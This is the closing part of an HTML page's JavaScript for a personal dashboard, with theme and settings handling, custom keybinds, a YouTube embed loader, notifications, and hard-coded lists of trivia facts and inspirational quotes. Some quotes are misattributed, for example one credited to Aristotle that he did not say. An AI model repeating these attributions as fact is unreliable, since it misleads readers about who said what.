  logActivity(`Converted ${fromValue} ${fromUnit} to ${result.toFixed(4)} ${toUnit}`, 'Unit Converter');
}

// Media functions
function loadMedia() {
  const url = document.getElementById('mediaUrl').value;
  const iframe = document.getElementById('mediaFrame');
  
  if (url.includes('youtube.com') || url.includes('youtu.be')) {
    let videoId = '';
    if (url.includes('youtube.com')) {
      videoId = url.split('v=')[1]?.split('&')[0];
    } else {
      videoId = url.split('/').pop();
    }
    
    if (videoId) {
      iframe.src = `https://www.youtube.com/embed/${videoId}`;
      logActivity(`Media loaded: YouTube video ${videoId}`, 'Media');
    } else {
        showNotification('Invalid YouTube URL or ID.', 'error');
        logActivity('Failed to load YouTube video: Invalid URL/ID', 'Media');
    }
  } else {
      showNotification('Only YouTube URLs are supported for now.', 'warning');
      logActivity('Attempted to load non-YouTube media', 'Media');
  }
}

// Theme functions
function toggleTheme() {
  // This function is now handled by the settings modal's theme selector
  // For quick access, we can toggle between a default light/dark
  const currentTheme = document.documentElement.className;
  if (currentTheme === 'theme-dark' || currentTheme === '') {
      applyTheme('light');
  } else {
      applyTheme('dark');
  }
  logActivity('Theme toggled via quick button', 'Theme');
}

function applyTheme(themeName) {
  const root = document.documentElement;
  
  // Remove all existing theme classes
  root.className = ''; 
  root.classList.add(`theme-${themeName}`);
  
  // Update active state in theme selector
  document.querySelectorAll('.theme-option').forEach(opt => {
    if (opt.dataset.theme === themeName) {
      opt.classList.add('active');
    } else {
      opt.classList.remove('active');
    }
  });
  
  saveSetting('theme', themeName);
  logActivity(`Theme changed to: ${themeName}`, 'Theme');
}

// Settings functions
let settings = {};
function loadSettings() {
    const storedSettings = localStorage.getItem('dashboardSettings');
    if (storedSettings) {
        settings = JSON.parse(storedSettings);
    } else {
        // Default settings
        settings = {
            darkMode: true,
            autoSaveNotes: true,
            soundNotifications: false,
            autoRefreshData: true,
            compactView: false,
            showAnimations: true,
            highContrast: false,
            autoBackup: true,
            securityMode: true,
            advancedLogging: false,
            performanceMode: false,
            developerMode: false,
            experimentalFeatures: false,
            dataCompression: true,
            realtimeSync: false,
            theme: 'orange' // Default theme
        };
    }
    applySettings();
}

function applySettings() {
    // Apply theme
    document.documentElement.className = ''; // Clear existing
    document.documentElement.classList.add(`theme-${settings.theme}`);
    document.querySelectorAll('.theme-option').forEach(opt => {
        if (opt.dataset.theme === settings.theme) {
            opt.classList.add('active');
        } else {
            opt.classList.remove('active');
        }
    });

    // Apply toggles
    document.getElementById('darkModeToggle').classList.toggle('active', settings.darkMode);
    document.getElementById('autoSaveNotesToggle').classList.toggle('active', settings.autoSaveNotes);
    document.getElementById('soundNotificationsToggle').classList.toggle('active', settings.soundNotifications);
    document.getElementById('autoRefreshDataToggle').classList.toggle('active', settings.autoRefreshData);
    document.getElementById('compactViewToggle').classList.toggle('active', settings.compactView);
    document.getElementById('showAnimationsToggle').classList.toggle('active', settings.showAnimations);
    document.getElementById('highContrastToggle').classList.toggle('active', settings.highContrast);
    document.getElementById('autoBackupToggle').classList.toggle('active', settings.autoBackup);
    document.getElementById('securityModeToggle').classList.toggle('active', settings.securityMode);
    document.getElementById('advancedLoggingToggle').classList.toggle('active', settings.advancedLogging);
    document.getElementById('performanceModeToggle').classList.toggle('active', settings.performanceMode);
    document.getElementById('developerModeToggle').classList.toggle('active', settings.developerMode);
    document.getElementById('experimentalFeaturesToggle').classList.toggle('active', settings.experimentalFeatures);
    document.getElementById('dataCompressionToggle').classList.toggle('active', settings.dataCompression);
    document.getElementById('realtimeSyncToggle').classList.toggle('active', settings.realtimeSync);

    // Apply other settings (e.g., font size, layout if implemented)
    // For now, just log them
    console.log("Settings applied:", settings);
}

function saveSetting(name, value) {
    settings[name] = value;
    localStorage.setItem('dashboardSettings', JSON.stringify(settings));
    applySettings(); // Re-apply settings immediately
}

function toggleSetting(element, settingName) {
    element.classList.toggle('active');
    const newState = element.classList.contains('active');
    saveSetting(settingName, newState);
    stats.toggleSwitches++;
    logActivity(`Setting "${settingName}" toggled to ${newState}`, 'Settings');
    updateStats();
}

// Keybinds
let keybinds = {};
const defaultKeybinds = {
    openSettings: 'Control+,',
    quickSearch: 'Control+K',
    newNote: 'Control+N',
    saveAll: 'Control+S',
    toggleTheme: 'Control+T',
    openCalculator: 'Control+C',
    openMedia: 'Control+M',
    openTimer: 'Control+W',
    openStats: 'Control+B',
    downloadLogs: 'Control+L'
};

function loadKeybinds() {
    const storedKeybinds = localStorage.getItem('dashboardKeybinds');
    if (storedKeybinds) {
        keybinds = JSON.parse(storedKeybinds);
    } else {
        keybinds = defaultKeybinds;
    }
    renderKeybinds();
}

function renderKeybinds() {
    const keybindsList = document.getElementById('keybindsList');
    if (!keybindsList) return; // Ensure element exists
    keybindsList.innerHTML = ''; // Clear existing

    for (const action in keybinds) {
        const keybindItem = document.createElement('div');
        keybindItem.className = 'keybind-item';
        keybindItem.innerHTML = `
            <span>${action.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}</span>
            <input type="text" class="keybind-input" value="${keybinds[action]}" readonly data-action="${action}">
        `;
        keybindsList.appendChild(keybindItem);
    }

    keybindsList.querySelectorAll('.keybind-input').forEach(input => {
        input.addEventListener('focus', (e) => {
            e.target.value = 'Press keys...';
            e.target.dataset.recording = 'true';
        });
        input.addEventListener('blur', (e) => {
            if (e.target.dataset.recording === 'true') {
                e.target.value = keybinds[e.target.dataset.action]; // Revert if no key pressed
            }
            e.target.dataset.recording = 'false';
        });
        input.addEventListener('keydown', (e) => {
            if (e.target.dataset.recording === 'true') {
                e.preventDefault();
                let key = e.key;
                let modifiers = [];
                if (e.ctrlKey) modifiers.push('Control');
                if (e.shiftKey) modifiers.push('Shift');
                if (e.altKey) modifiers.push('Alt');
                if (e.metaKey) modifiers.push('Meta'); // Command key on Mac

                // Filter out modifier keys themselves if they are the only key
                if (['Control', 'Shift', 'Alt', 'Meta'].includes(key)) {
                    key = ''; // Don't add modifier as the key if it's just the modifier
                }

                const newKeybind = [...modifiers, key].filter(Boolean).join('+');
                e.target.value = newKeybind;
                keybinds[e.target.dataset.action] = newKeybind;
                localStorage.setItem('dashboardKeybinds', JSON.stringify(keybinds));
                e.target.blur();
                logActivity(`Keybind for "${e.target.dataset.action}" set to "${newKeybind}"`, 'Keybinds');
            }
        });
    });
}

document.addEventListener('keydown', (e) => {
    // Don't trigger keybinds if an input field is focused
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        return;
    }

    let pressedKey = e.key;
    let modifiers = [];
    if (e.ctrlKey) modifiers.push('Control');
    if (e.shiftKey) modifiers.push('Shift');
    if (e.altKey) modifiers.push('Alt');
    if (e.metaKey) modifiers.push('Meta');

    // Special handling for modifier keys themselves
    if (['Control', 'Shift', 'Alt', 'Meta'].includes(pressedKey)) {
        pressedKey = ''; // Don't use modifier as the key if it's just the modifier
    }

    const currentKeybind = [...modifiers, pressedKey].filter(Boolean).join('+');

    for (const action in keybinds) {
        if (keybinds[action] === currentKeybind) {
            e.preventDefault(); // Prevent default browser action
            triggerKeybindAction(action);
            logActivity(`Keybind triggered: "${action}" with "${currentKeybind}"`, 'Keybinds');
            break;
        }
    }
});

function triggerKeybindAction(action) {
    switch (action) {
        case 'openSettings': togglePanel('settingsModal'); break;
        case 'quickSearch': document.getElementById('searchBar').focus(); break;
        case 'newNote': togglePanel('notesPanel'); break;
        case 'saveAll': saveCanvas(); saveTextNotes(); showNotification('All notes saved!', 'success'); break;
        case 'toggleTheme': toggleTheme(); break;
        case 'openCalculator': togglePanel('calculatorPanel'); break;
        case 'openMedia': togglePanel('mediaPanel'); break;
        case 'openTimer': togglePanel('timerPanel'); break;
        case 'openStats': showStats(); break;
        case 'downloadLogs': downloadActivityLogs(); break;
        default: console.log(`Keybind action "${action}" not implemented.`);
    }
}


// Refresh functions
function refreshFact() {
  const facts = [
    "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3000 years old and still perfectly edible.",
    "A group of flamingos is called a 'flamboyance'.",
    "Bananas are berries, but strawberries aren't.",
    "The shortest war in history lasted only 38-45 minutes.",
    "A single cloud can weigh more than a million pounds.",
    "The Great Wall of China is not visible from space with the naked eye.",
    "Octopuses have three hearts.",
    "A 'jiffy' is an actual unit of time: 1/100th of a second.",
    "The average person walks the equivalent of three times around the world in a lifetime.",
    "There are more stars in the universe than grains of sand on all the beaches on Earth."
  ];
  
  document.getElementById('randomFact').textContent = facts[Math.floor(Math.random() * facts.length)];
  logActivity('Random fact refreshed', 'Content');
}

function refreshQuote() {
  const quotes = [
    "\"The only way to do great work is to love what you do.\" - Steve Jobs",
    "\"Innovation distinguishes between a leader and a follower.\" - Steve Jobs",
    "\"Life is what happens to you while you're busy making other plans.\" - John Lennon",
    "\"The future belongs to those who believe in the beauty of their dreams.\" - Eleanor Roosevelt",
    "\"It is during our darkest moments that we must focus to see the light.\" - Aristotle",
    "\"The only limit to our realization of tomorrow will be our doubts of today.\" - Franklin D. Roosevelt",
    "\"Strive not to be a success, but rather to be of value.\" - Albert Einstein",
    "\"Believe you can and you're halfway there.\" - Theodore Roosevelt",
    "\"The mind is everything. What you think you become.\" - Buddha",
    "\"The best way to predict the future is to create it.\" - Peter Drucker"
  ];
  
  document.getElementById('dailyQuote').textContent = quotes[Math.floor(Math.random() * quotes.length)];
  logActivity('Daily quote refreshed', 'Content');
}

function refreshWifi() {
  // Simulate refreshing WiFi data
  showNotification('WiFi data updated', 'info');
  logActivity('WiFi information refreshed', 'Network');
}

function clearNotifications() {
  document.getElementById('notificationsList').innerHTML = '';
  showNotification('Notifications cleared', 'info');
  logActivity('Notifications cleared', 'Notifications');
}

function clearActivityLogs() {
  activityLogs = [];
  updateActivityLogDisplay();
  showNotification('Activity logs cleared', 'info');
  logActivity('Activity logs cleared', 'System');
}

function showNotification(message, type = 'info') {
  const notification = document.getElementById('welcomeNotification'); // Reusing this element
  const icon = notification.querySelector('i');
  const textSpan = notification.querySelector('span');

  textSpan.textContent = message;
  
  // Reset classes
  notification.className = 'notification';
  icon.className = '';

  // Apply type-specific styling and icon
  if (type === 'success') {
      notification.style.background = 'linear-gradient(135deg, var(--success-color), #00cc33)';
      icon.classList.add('fas', 'fa-check-circle');
  } else if (type === 'warning') {
      notification.style.background = 'linear-gradient(135deg, var(--warning-color), #e69900)';
      icon.classList.add('fas', 'fa-exclamation-triangle');
  } else if (type === 'error') {
      notification.style.background = 'linear-gradient(135deg, var(--error-color), #cc0033)';
      icon.classList.add('fas', 'fa-times-circle');
  } else { // info
      notification.style.background = 'linear-gradient(135deg, var(--accent-color), var(--accent-secondary))';
      icon.classList.add('fas', 'fa-info-circle');
  }
  
  notification.classList.remove('hidden');
  setTimeout(() => {
    notification.classList.add('hidden');
  }, 3000);
}

function logout() {
  if (confirm('Are you sure you want to logout?')) {
    logActivity('User logged out', 'Login');
    location.reload();
  }
}

function applyWifiLevelColors() {
    document.querySelectorAll('#wifiGrid .wifi-item').forEach(item => {
        item.classList.remove('wifi-high', 'wifi-medium', 'wifi-low'); // Clear existing
        const levelText = item.dataset.level; // Use data-level attribute
        if (levelText === 'High') {
            item.classList.add('wifi-high');
        } else if (levelText === 'Medium') {
            item.classList.add('wifi-medium');
        } else if (levelText === 'Low') {
            item.classList.add('wifi-low');
        }
    });
    logActivity('Applied WiFi level colors', 'UI');
}


// Event listeners
document.addEventListener('DOMContentLoaded', () => {
  setupToggles();
  
  // Submit button
  document.getElementById('submitBtn').addEventListener('click', (e) => {
    e.preventDefault();
    stats.buttonPresses++;
    attemptLogin();
  });
  
  // Enter key for login
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !document.getElementById('loginScreen').classList.contains('hidden')) {
      attemptLogin();
    }
  });
  
  // Theme selector buttons
  document.getElementById('themeSelector').addEventListener('click', (e) => {
      const themeOption = e.target.closest('.theme-option');
      if (themeOption) {
          applyTheme(themeOption.dataset.theme);
      }
  });
  
  // Track all button clicks for stats
  document.addEventListener('click', (e) => {
    if (e.target.tagName === 'BUTTON' || e.target.classList.contains('quick-btn')) {
      stats.buttonPresses++;
      updateStats();
    }
  });
});
</script>

</body>
</html>
